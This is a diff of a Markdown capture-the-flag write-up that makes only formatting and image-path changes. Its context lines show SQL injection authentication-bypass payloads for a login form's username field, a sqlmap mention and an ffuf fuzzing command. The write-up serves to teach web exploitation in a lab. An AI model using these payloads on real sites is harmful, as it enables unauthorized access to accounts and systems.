@@ -28,7 +28,7 @@ Interesting file found: `composer.json` . The content of the file confirms the p
 
 I found the following comments at the bottom of the source code of the `/` page:
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 After navigating to the `mail.log` file, I found the following note:
 
@@ -141,13 +141,13 @@ Injection to `username` POST field:
 ||1=1;-- - //clearer
 ```
 
-* This works with space in between the items too:&#x20;
+* This works with space in between the items too:
 
 ```sql
 ' || 1=1;-- -
 ```
 
-`' || 1=1; --`&#x20;
+`' || 1=1; --`
 
 ```sql
 SELECT * FROM table WHERE username = ''||1=1'-- AND password = '1' 
@@ -155,7 +155,7 @@ SELECT * FROM table WHERE username = ''||1=1'-- AND password = '1'
 
 **Further learning**
 
-* To explore what other injection methods can be used, I utilized Sqlmap:&#x20;
+* To explore what other injection methods can be used, I utilized Sqlmap:
 
 > `login.txt` contains the HTTP POST request from above
 
@@ -184,7 +184,7 @@ $ ffuf -u http://<target>functions.php -w auth_wordlist.txt -X POST -d "username
 ```
 {% endcode %}
 
-There should be some output(s) that returns a larger response size than the rest.  The `-fs` flag can be used to filter this.
+There should be some output(s) that returns a larger response size than the rest. The `-fs` flag can be used to filter this.
 
 Found payload:
 
